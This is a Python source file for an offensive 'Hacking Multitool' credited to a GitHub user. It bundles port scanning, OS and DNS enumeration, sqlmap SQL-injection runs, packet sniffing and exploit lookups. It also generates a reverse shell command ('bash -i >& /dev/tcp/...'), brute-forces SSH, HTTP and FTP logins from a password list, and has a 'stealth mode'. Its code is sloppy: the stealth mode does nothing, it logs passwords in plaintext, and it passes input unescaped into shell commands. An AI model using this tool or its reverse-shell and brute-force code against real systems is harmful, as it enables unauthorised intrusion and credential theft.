import argparse
import socket
import hashlib
import requests
import threading
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
import paramiko
import ftplib
import subprocess
import scapy.all as scapy
import os
import json
import logging
from scp import SCPClient

# Configure logging for auto-reporting
logging.basicConfig(filename='report.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Gradient banner
def print_banner():
    banner = (
        " ███▄ ▄███▓ █    ██  ██▓  ▄▄▄█████▓ ██▓▄▄▄█████▓ ▒█████   ▒█████   ██▓    \n"
        "▓██▒▀█▀ ██▒ ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    \n"
        "▓██    ▓██░▓██  ▒██░▒██░  ▒ ▓██░ ▒░▒██▒▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    \n"
        "▒██    ▒██ ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ░██░░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    \n"
        "▒██▒   ░██▒▒▒█████▓ ░██████▒▒██▒ ░ ░██░  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒\n"
        "░ ▒░   ░  ░░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░▓    ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░\n"
        "░  ░      ░░░▒░ ░ ░ ░ ░ ▒  ░  ░     ▒ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░\n"
        "░      ░    ░░░ ░ ░   ░ ░   ░       ▒ ░  ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   \n"
        "                   Created By SaadSaid158 on GitHub                       \n"
        "          With great power comes great responsibility — Stan Lee          \n"
    )
    print(banner)

# Global variables
open_ports = []

# Function to check and install missing tools
def install_missing_tools():
    tools = ['nmap', 'enum4linux', 'sqlmap', 'dig', 'sshpass']
    for tool in tools:
        try:
            subprocess.run([tool, '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except FileNotFoundError:
            logging.info(f"{tool} not found. Installing...")
            subprocess.run(['sudo', 'apt-get', 'install', '-y', tool])

# Port Scanner with Banner Grabbing
def port_scan(ip, port_range):
    logging.info(f"Scanning {ip} for open ports in range {port_range}...")
    start_port, end_port = map(int, port_range.split('-'))
    threads = []

    def scan_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    logging.info(f"Port {port} is open")
                    open_ports.append(port)
                    grab_banner(ip, port)
        except Exception as e:
            logging.error(f"Error scanning port {port}: {e}")

    for port in range(start_port, end_port + 1):
        thread = threading.Thread(target=scan_port, args=(port,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def grab_banner(ip, port):
    try:
        with socket.socket() as sock:
            sock.connect((ip, port))
            sock.settimeout(1)
            banner = sock.recv(1024).decode().strip()
            logging.info(f"Banner from port {port}: {banner}")
    except Exception as e:
        logging.error(f"Error grabbing banner from port {port}: {e}")

# SearchSploit Lookup
def searchsploit_lookup(term):
    logging.info(f"Searching for exploits related to: {term}...")
    try:
        output = subprocess.check_output(f"searchsploit {term}", shell=True, stderr=subprocess.STDOUT).decode()
        logging.info(f"Searchsploit Results:\n{output}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error during searchsploit lookup: {e.output.decode()}")
        
# OS Detection
def detect_os(ip):
    logging.info(f"Detecting OS for {ip}...")
    try:
        response = subprocess.check_output(f"nmap -O {ip}", shell=True, stderr=subprocess.STDOUT).decode()
        logging.info(response)
    except subprocess.CalledProcessError as e:
        logging.error(f"Error detecting OS: {e.output.decode()}")

# GeoIP Lookup
def geoip_lookup(ip):
    logging.info(f"Looking up GeoIP for {ip}...")
    response = requests.get(f"http://ip-api.com/json/{ip}")
    if response.status_code == 200:
        data = response.json()
        logging.info(f"GeoIP Data: {data}")
    else:
        logging.error("Failed to retrieve GeoIP data.")

# SQL Injection Check using SQLmap
def sql_injection_check(url):
    logging.info(f"Checking {url} for SQL injection...")
    subprocess.run(f"sqlmap -u {url} --batch", shell=True)

# Password Strength Checker
def password_strength(password):
    logging.info(f"Checking strength for password: {password}")
    if len(password) < 8:
        return "Weak"
    if any(char.isdigit() for char in password) and any(char.isalpha() for char in password):
        return "Strong"
    return "Moderate"

# DNS Enumeration
def dns_enumeration(domain):
    logging.info(f"Enumerating DNS records for {domain}...")
    subprocess.run(f"dig {domain} ANY", shell=True)

# Enum4Linux
def enum4linux(ip):
    logging.info(f"Running Enum4Linux on {ip}...")
    subprocess.run(f"enum4linux {ip}", shell=True)

# Reverse Shell Generation
def reverse_shell(ip, port):
    logging.info(f"Generating reverse shell command to {ip}:{port}...")
    reverse_shell_command = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    logging.info(f"Reverse shell command: {reverse_shell_command}")

# Stealth Mode Implementation
def stealth_mode():
    logging.info("Activating stealth mode...")
    os.environ['LOGGING_LEVEL'] = 'ERROR'
    logging.info("Logging level set to ERROR.")

# Advanced Brute Forcing
def brute_force(target, username, password_file, protocol):
    logging.info(f"Starting brute force on {target} as {username}...")
    with open(password_file, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            if try_login(target, username, password, protocol):
                logging.info(f"Success! Username: {username}, Password: {password}")
                return
    logging.warning("Brute force failed.")

def try_login(target, username, password, protocol):
    if protocol == 'ssh':
        return ssh_login(target, username, password)
    elif protocol == 'http':
        return http_login(target, username, password)
    elif protocol == 'ftp':
        return ftp_login(target, username, password)
    return False

def ssh_login(target, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target, username=username, password=password, timeout=2)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        logging.error(f"SSH login error: {e}")
        return False

def http_login(target, username, password):
    url = f"http://{target}/login"
    data = {'username': username, 'password': password}
    try:
        response = requests.post(url, data=data)
        return "Login successful" in response.text
    except requests.RequestException as e:
        logging.error(f"HTTP login error: {e}")
        return False

def ftp_login(target, username, password):
    try:
        ftp = ftplib.FTP(target)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        logging.error(f"FTP login error: {e}")
        return False

# File Encryption/Decryption
def encrypt_file(filename, password):
    logging.info(f"Encrypting {filename}...")
    key = PBKDF2(password.encode(), b'salt', dkLen=32)
    cipher = AES.new(key, AES.MODE_GCM)
    with open(filename, 'rb') as f:
        data = f.read()
    ciphertext, tag = cipher.encrypt_and_digest(data)
    with open(filename + '.enc', 'wb') as f:
        f.write(cipher.nonce + tag + ciphertext)
    logging.info(f"{filename} encrypted successfully!")

def decrypt_file(filename, password):
    logging.info(f"Decrypting {filename}...")
    with open(filename, 'rb') as f:
        nonce, tag, ciphertext = f.read(16), f.read(16), f.read()
    key = PBKDF2(password.encode(), b'salt', dkLen=32)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)
    with open(filename[:-4], 'wb') as f:
        f.write(data)
    logging.info(f"{filename} decrypted successfully!")

# Scapy Packet Capture
def capture_packets(interface):
    logging.info(f"Capturing packets on {interface}...")
    packets = scapy.sniff(iface=interface, count=10)
    scapy.wrpcap('captured_packets.pcap', packets)
    logging.info("Packets captured successfully!")

# Command-line Interface
def main():
    print_banner()
    
    # Install missing tools
    install_missing_tools()
    
    parser = argparse.ArgumentParser(description='Hacking Multitool')
    parser.add_argument('--port-scan', nargs=2, metavar=('IP', 'RANGE'), help='Scan ports in RANGE (e.g., 1-100)')
    parser.add_argument('--os-detect', metavar='IP', help='Detect OS for IP')
    parser.add_argument('--geoip', metavar='IP', help='Perform GeoIP lookup for IP')
    parser.add_argument('--sql-injection', metavar='URL', help='Check URL for SQL injection')
    parser.add_argument('--password-strength', metavar='PASSWORD', help='Check password strength')
    parser.add_argument('--dns-enum', metavar='DOMAIN', help='Enumerate DNS records for DOMAIN')
    parser.add_argument('--enum4linux', metavar='IP', help='Run Enum4Linux on IP')
    parser.add_argument('--reverse-shell', nargs=2, metavar=('IP', 'PORT'), help='Generate reverse shell')
    parser.add_argument('--stealth', action='store_true', help='Activate stealth mode')
    parser.add_argument('--brute-force', nargs=3, metavar=('TARGET', 'USERNAME', 'PASSWORD_FILE'), help='Brute force login on TARGET')
    parser.add_argument('--encrypt', nargs=2, metavar=('FILE', 'PASSWORD'), help='Encrypt FILE with PASSWORD')
    parser.add_argument('--decrypt', nargs=2, metavar=('FILE', 'PASSWORD'), help='Decrypt FILE with PASSWORD')
    parser.add_argument('--capture', metavar='INTERFACE', help='Capture packets on INTERFACE')
    parser.add_argument('--searchsploit', metavar='TERM', help='Search for exploits related to TERM')

    args = parser.parse_args()

    if args.port_scan:
        port_scan(args.port_scan[0], args.port_scan[1])
    if args.os_detect:
        detect_os(args.os_detect)
    if args.geoip:
        geoip_lookup(args.geoip)
    if args.sql_injection:
        sql_injection_check(args.sql_injection)
    if args.password_strength:
        strength = password_strength(args.password_strength)
        logging.info(f"Password strength: {strength}")
    if args.dns_enum:
        dns_enumeration(args.dns_enum)
    if args.enum4linux:
        enum4linux(args.enum4linux)
    if args.reverse_shell:
        reverse_shell(args.reverse_shell[0], args.reverse_shell[1])
    if args.searchsploit:
        searchsploit_lookup(args.searchsploit)
    if args.stealth:
        stealth_mode()
    if args.brute_force:
        brute_force(args.brute_force[0], args.brute_force[1], args.brute_force[2], 'ssh')  # default to SSH
    if args.encrypt:
        encrypt_file(args.encrypt[0], args.encrypt[1])
    if args.decrypt:
        decrypt_file(args.decrypt[0], args.decrypt[1])
    if args.capture:
        capture_packets(args.capture)

if __name__ == "__main__":
    main()
